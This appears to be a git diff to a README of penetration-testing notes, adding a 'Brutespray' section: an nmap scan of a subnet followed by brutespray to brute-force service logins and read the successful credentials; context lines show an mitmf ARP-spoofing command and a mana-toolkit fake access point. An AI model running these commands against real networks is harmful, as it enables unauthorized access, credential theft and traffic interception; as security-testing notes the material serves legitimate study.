@@ -173,6 +173,12 @@ mitmf --arp --spoof --hsts --gateway <routerIP> --target <targetIP> -i <interfac
 5. start fake AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 6. Test it with phone or other machine, NOT host machine. 
 
+## Brutespray 
+
+1. nmap the network with: `nmap -sS -sV 10.0.2.0/24 -vv -n -oA test`
+2. `brutespray --file test.gnmap -t 5 -T 2`
+3. `cat` the succeeded files. 
+
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
 
